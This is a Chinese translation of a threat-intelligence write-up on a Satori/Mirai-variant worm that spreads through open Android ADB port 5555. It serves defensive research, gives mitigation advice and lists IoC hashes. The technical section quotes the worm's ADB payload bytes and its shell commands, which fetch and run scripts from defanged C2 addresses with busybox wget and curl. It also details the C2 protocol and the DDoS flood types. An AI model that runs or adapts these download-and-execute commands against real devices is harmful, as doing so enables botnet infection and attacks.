***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

## 写在前面的话

**对于许多物联网用户来说，利用设备上的开放端口一直是一个持续存在的问题。特别是TCP端口5555在过去遇到过问题，因为这是产品制造商在出厂之前将其打开，所以这可能会使用户暴露给攻击者。最近，我们在7月9日至10日和7月15日检测到两个可疑峰值，发现了这是一个使用端口5555的新漏洞。**

该活动涉及名为Android Debug Bridge（ADB）的命令行实用程序，这是Android
SDK的一部分，用于处理设备之间的通信，允许开发人员在Android设备上运行和调试应用程序。我们的数据显示，第一波网络流量主要来自中国和美国，而第二波主要涉及韩国。
![](https://image.3001.net/images/20180726/15326079467407.jpg!small)

## 技术分析

根据我们对网络数据包的分析，我们确定恶意软件通过扫描的开放式ADB端口进行传播。它通过ADB连接删除第1阶段shell脚本，以在目标系统上启动。此脚本下载两个阶段2
shell脚本，负责启动阶段3二进制文件。它通过TCP端口5555上传payload.来攻击ADB：“CNXN”,0,0,0,1,0,0×10,0,0,7,0,0,0,”2″,2,0,0,0xBC,0xB1,0xA7,0xB1,”host::”一旦加载到设备中，payload将从磁盘中删除自身，并使用随机选择的名称重命名，并附加架构字符串。payload将下载shell脚本，该脚本在执行后被删除：

“OPENX”,2,0,0,0,0,0,0,0xF2,0x17,”J”,0,0,0xB0,0xAF,0xBA,0xB1,”shell:>/sdcard/Download/f
&& cd /sdcard/Download/; >/dev/f && cd /dev/; >/data/local/tmp/f && cd
/data/local/tmp/; busybox wget hxxp://185[.]62[.]189[.]149/adbs -O -> adbs; sh
adbs; curl hxxp://185[.]62[.]189[.]149/adbs2 > adbs2; sh adbs2; rm adbs
adbs2″7月9日活动的shell脚本如下所示：cd /dev/; busybox wget
hxxp://95[.]215[.]62[.]169/adbs -O -> adbs; sh adbs; rm
adbs![](https://image.3001.net/images/20180726/15326079676215.png!small)相比之下，7月15日活动的payload代替了两个脚本：早期的“adbs”和一个名为“adbs2”的新脚本。和以前一样，它会在执行后删除它们：cd
/data/local/tmp/; busybox wget hxxp://185[.]62[.]189[.]149/adbs -O -> adbs; sh
adbs; curl hxxp://185[.]62[.]189[.]149/adbs2 > adbs2; sh adbs2; rm adbs
adbs2![](https://image.3001.net/images/20180726/15326080031119.png!small)这些脚本下载了几个架构的下一个阶段二进制文件，并启动相应的版本。它们都做相同的事情，但使用不同的下载方法。第一个使用curl，第二个使用在BusyBox中构建的wget。wget版本的示例如下所示：
![](https://image.3001.net/images/20180726/15326080542044.png!small)二进制文件首先从文件系统中删除自己的二进制文件。然后它使用参数“yItDitb2HvayJvNc”检查它自己的名字是否是“./.f”。如果结果是肯定的，它将使用主机名“n[.]ukrainianhorseriding[.]com”来解析C＆C的地址服务器通过谷歌DNS服务器。否则，它连线IP地址95[.]215[.]62[.]169，连接端口为7267。然后它将关闭所有三个stdio流并获得自己的IP地址，然后启动两个子进程。第一个扫描/proc/[pid]/maps映射系统上所有正在运行的进程的内存映射区域，以打开临时文件smi，xig或trinity。如果找到，它会杀死相应的进程。Trinity可能与Android系统模糊器有关，而smi是属于CoinHive脚本的已知文件，该脚本在被劫持的亚马逊设备上挖掘Monero。第二个子进程负责将恶意软件作为蠕虫传播。二进制文件继续将前面提到的所有三个pid以二进制形式写入以下位置之一：
![](https://image.3001.net/images/20180726/15326080729665.png!small)然后二进制文件打开与C＆C服务器的连接：![](https://image.3001.net/images/20180726/15326080891718.jpg!small)然后，它会将特制消息发送到C＆C服务器。它的长度是71个字节，如下所示：“WWau14TJ8IapVXrrlFq0q5sxB”,
“\x00 80 00 5A 00 57 00 C8 00 F0 00 1E 00 00”和附加的体系结构字符串，即32字节数组中的“arm7”。

    
    
    C2 then sends to the victim  
    2 bytes number (x)  
    Interpretation is following:  
    if x == 505: receive next 2 bytes from C2  
    if x == 0xDD99: kill children and exit  
    if x > 1024: close connection and sleep(10)  
    else:  
    receive x bytes from C2 (they are not used, maybe this version is not finishet yet)  
    receive new x  
    recv payload containing attacking target list of len x bytes`  
    

每六个通信周期，受害者以6字节序列（9,3,2,5,8,1）响应。此有效内容包含一个标头，其中包含要发送的目标数和IP数据包类型，然后是被受感染主机修改的目标IPv4地址列表，这些目标IPv4地址由受感染主机修改并随机生成的偏移量。然后，恶意软件将带有随机生成的payload的精心制作的IP数据包发送到获取的攻击列表——可能是DDoS攻击的一部分。IP数据包包括以下内容：

1.UDP随机生成随机长度的payload2.具有随机长度的随机payload的TCP SYN分组3.TCP
ACK具有随机长度的随机payload4.通过通用路由封装（GRE）隧道传输的随机payload的UDP5.TCP SYN，之后它将发送TCP
ACK并确保TCP窗口大小，源端口，seq_number和IP标识与前一个会话一致。每个数据包之间有三秒钟的等待时间。从下载的二进制文件研究人员发现C＆C服务器95[.]215[.]62[.]169链接到Mirai僵尸网络的Satori变体。深入研究活动中涉及的两个IP地址的GeoIP信息，发现它们位于欧洲;
西班牙95[.]215[.]62[.]169和荷兰185[.]62[.]189[.]149。我们有理由相信，这个样本和Satori背后都是同一作者。使用简单的XOR方法进行加密(参见图8中的加密字符串示例)。有趣的是，与使用字节交换和Base62编码组合的旧样本相比，此恶意软件版本使用的复杂字符串加密方法较少

![](https://image.3001.net/images/20180726/15326081131568.png!small)他们的解密值可以在下图中看到。请注意，并非所有这些都已使用。  
![](https://image.3001.net/images/20180726/15326081312341.png!small)如前所述，蠕虫功能和寻找其他潜在目标可能意味着我们检测到的两个活动峰值可能是另一个可能造成更多伤害的攻击的前奏。也许在这种情况下，威胁参与者正在测试他们的工具和策略的有效性，以准备更严重的攻击。C＆C域名信息显示与域rippr[.]cc上的另一个C＆C服务器相同的注册电子邮件，该域名已经关闭：  
![](https://image.3001.net/images/20180726/1532608154587.jpg!small)Shodan的数据显示，逾4.8万个物联网系统容易受到亚行开发利用的影响。并不是所有的脆弱系统都公开，因为它们通常隐藏在具有网络地址转换(NAT)的路由器后面。但是，由于配置错误，可以手动或通过UPnP
NAT遍历访问它们。所有的多媒体设备、智能电视、移动电话和其他没有附加保护的设备都很容易成为恶意软件攻击的目标，不管用户的密码有多强。

## 解决方案

如果用户愿意改变移动设备的设置，就可以进入设置，选择“开发者选项”，并确保“ADB
(USB)调试”和“来自未知来源的应用程序”被关闭，后者默认设置为关闭，但必须进行双重检查以确保。如果用户怀疑他们的设备已经被感染，进行工厂重置可以清除payload。作为一般规则，移动设备用户应定期将其设备更新为最新版本。这些更新不仅可以改善其设备的功能，还可以解决攻击者可以利用的漏洞。

## IoCs:

### UNIX_MIRAI.DLDS

> 79d55852af173612562718544ecdc569b0b8e0094647d609040f8fcc67112cba
>
> 144e9093b50d7a0bf92ccc29dbbdab4955a8ef028ec2a4a64f2c16778fc0ba43

### ELF_MIRAI.LBOUG

> 2815ab8fe6d48982540524c6ac55e1df3a77a2e90c32114fde05bdc3bb353bea
>
> 144e9093b50d7a0bf92ccc29dbbdab4955a8ef028ec2a4a64f2c16778fc0ba43
>
> 01eca0d68cc8c2d7ad6aa8021852b57a04b8a4ca7d13e164095b29fd06a1ed9f
>
> 4c3983040b2c72e4df9742c1314dcf8cd703805ab6aaa9185324b70fd530746e

 ***参考来源：[trendmicro](https://blog.trendmicro.com/trendlabs-security-intelligence/open-adb-ports-being-exploited-to-spread-possible-satori-variant-in-android-devices/)，由周大涛编译，转载请注明来自FreeBuf.COM**

